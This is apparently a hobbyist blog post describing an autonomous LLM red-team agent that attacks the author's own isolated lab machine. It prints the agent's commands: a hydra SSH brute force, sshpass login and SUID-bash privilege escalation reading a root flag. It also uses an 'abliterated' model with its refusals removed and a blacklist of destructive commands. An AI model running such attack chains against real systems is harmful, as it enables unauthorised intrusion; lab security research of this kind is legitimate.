---
date: 2025-10-08
title: Building an Autonomous Hacking Agent (That Actually Works)
tags: [OFFENSIVE SECURITY, RED TEAM, KUBERNETES, BLACKARCH, LLM, MCP]
---

Got K3s cluster running yesterday. MCP RAG server functional. Decided to build something defensible: autonomous red team agent. LLM-guided, 2000+ offensive tools, attacks physical hardware. Completely unnecessary. Built it anyway.

First problem: discovered I'd named all my nodes wrong. The "asus-laptop" was actually my MSI gaming laptop. The "celeron-potato" was the ASUS. Not sure what past-me was thinking. Clearly this required completely renaming everything:

- MochiMetasploit (MSI laptop)
- NekoNetcat (ASUS laptop)
- PandaPayload (Mac Pro target)
- FluffyFirewall (Proxmox server)

Yes, offensive security infrastructure named after cute things. The cognitive dissonance is intentional. Other devices will get similar treatment.

### The Concept (That Nobody Asked For)

Kubernetes pod with 2000+ BlackArch tools (hydra, nmap, metasploit, sqlmap). Queries MCP RAG server containing 5,395 offensive security documents (GTFOBins, Atomic Red Team, HackTricks). Makes decisions via local LLM (Qwen 2.5 Coder 14B abliterated). Attacks physical target machine.

Isolated by Kubernetes NetworkPolicy. Can only reach: target (192.168.1.99), MCP server, LLM, DNS. No internet. No other pods. Contained (in theory).

### The Obvious Mistake

Midway through testing: I forgot to actually give it any tools. Minimal Python container had SSH and curl. That's it. No hydra, no nmap, nothing useful. Rebuilt entire container from BlackArch base image. 2000+ tools, pre-installed. Problem solved through sheer brute force.

### Execution Flow (It Actually Worked)

<div style="background: var(--smoke); padding: 1.5rem; margin: 1.5rem 0; border-left: 5px solid var(--blood-red);">
  <p style="margin-bottom: 1rem; color: var(--blood-red); font-weight: 700;">ITERATION 1: RECONNAISSANCE</p>
  <ol style="margin-left: 1.5rem; line-height: 1.8;">
    <li>Agent queries MCP: "How do I brute force SSH with weak passwords?"</li>
    <li>MCP returns: Atomic Red Team T1110.001, hydra example</li>
    <li>Agent asks LLM: "What command should I run?"</li>
    <li>LLM suggests: <code>hydra -l victim -p password123 ssh://192.168.1.99</code></li>
    <li>Agent executes</li>
    <li>Result: Valid credentials found (victim:password123)</li>
  </ol>
</div>

<div style="background: var(--smoke); padding: 1.5rem; margin: 1.5rem 0; border-left: 5px solid var(--blood-red);">
  <p style="margin-bottom: 1rem; color: var(--blood-red); font-weight: 700;">ITERATION 2: ACCESS</p>
  <ol style="margin-left: 1.5rem; line-height: 1.8;">
    <li>Agent to LLM: "I have credentials. How establish SSH?"</li>
    <li>LLM: <code>sshpass -p 'password123' ssh victim@192.168.1.99 'whoami'</code></li>
    <li>Agent executes</li>
    <li>Result: SSH access confirmed, user-level compromise achieved</li>
  </ol>
</div>

<div style="background: var(--smoke); padding: 1.5rem; margin: 1.5rem 0; border-left: 5px solid var(--blood-red);">
  <p style="margin-bottom: 1rem; color: var(--blood-red); font-weight: 700;">ITERATION 3: PRIVILEGE ESCALATION</p>
  <ol style="margin-left: 1.5rem; line-height: 1.8;">
    <li>Agent queries MCP: "Escalate privileges with SUID binaries?"</li>
    <li>MCP returns: GTFOBins SUID bash technique</li>
    <li>Agent searches, finds: <code>/tmp/bash-suid</code></li>
    <li>Agent runs: <code>/tmp/bash-suid -p -c "whoami && cat /root/flag.txt"</code></li>
    <li>Result: Root access, flag captured (FLAG{you_got_root_access_congratulations})</li>
  </ol>
</div>

**Total time: 87 seconds. Six commands. 100% success rate.** Either the target was pathetically vulnerable or the agent got lucky. Probably both.

### Safety Measures (Because This Is Dangerous)

Running autonomous hacking agent requires containment. Multiple layers:

- **NetworkPolicy:** Declarative firewall, only reaches target/MCP/LLM/DNS
- **Command Sandbox:** Whitelist allowed tools, blacklist destructive patterns (rm -rf, dd, format)
- **Non-root:** Runs as UID 1000, all capabilities dropped
- **Resource Limits:** 1 CPU, 1GB RAM max (can't fork bomb the cluster)
- **Logging:** Every command timestamped, saved to JSON

### Why This Exists (Questionable Justification)

Had to build it myself because nothing combined:

- K8s-native autonomous red team agent
- MCP RAG for offensive security (semantic search over 5,395 exploit docs)
- LLM + RAG + execution loop for pentesting
- BlackArch in isolated pod (2000+ tools)
- Physical hardware targets (not just containers)

### The MCP Protocol Fix (3 Lines, 4 Hours)

Morning started with MCP server completely broken. 404 errors everywhere. LM Studio's MCP implementation released same day, my server wasn't handling `notifications/initialized` message that clients send post-handshake.

Fix was embarrassingly simple:

<div style="background: var(--smoke); padding: 1.5rem; margin: 1rem 0; border-left: 3px solid var(--blood-red);">
  <code style="display: block; line-height: 1.8;">
    elif method == "notifications/initialized":<br />
    &nbsp;&nbsp;&nbsp;&nbsp;logger.info("Received notifications/initialized from client")<br />
    &nbsp;&nbsp;&nbsp;&nbsp;return '', 200
  </code>
</div>

That's it. Client expects acknowledgment. Without it, handshake times out. With it, everything works. Spent 4 hours debugging because MCP spec doesn't emphasize which messages are critical vs optional. Should have added debug logging first. Didn't. Paid the price.

Fixed protocol bug by 2pm. Built autonomous hacking agent by 8pm. Day well spent (probably).

<div style="background: var(--ash-gray); padding: 2rem; margin: 2rem 0; border: 3px solid var(--blood-red);">
  <p style="text-align: center; font-size: 1.3rem; color: var(--blood-red); margin-bottom: 1rem;">
    <strong>FINAL ARCHITECTURE</strong>
  </p>
  <pre style="color: var(--pure-white); line-height: 1.6; overflow-x: auto;">
Main PC (192.168.1.84)
    ↓ LLM Queries (Qwen 2.5 Coder 14B Abliterated)
K3s Cluster - FluffyFirewall (192.168.1.181)
    ├─ MCP RAG Server (5,395 docs: GTFOBins, Atomic Red Team, HackTricks)
    ├─ Red Team Agent (2000+ BlackArch tools)
    │  └─ NetworkPolicy (containment, allegedly)
    └─ Targets: MochiMetasploit, NekoNetcat, PandaPayload
  </pre>
</div>

Tomorrow: sanitize code (remove hardcoded IPs), write documentation (2500+ lines apparently), maybe push to GitHub. This probably qualifies as a proof of concept. Whether anyone needs it is a different question.
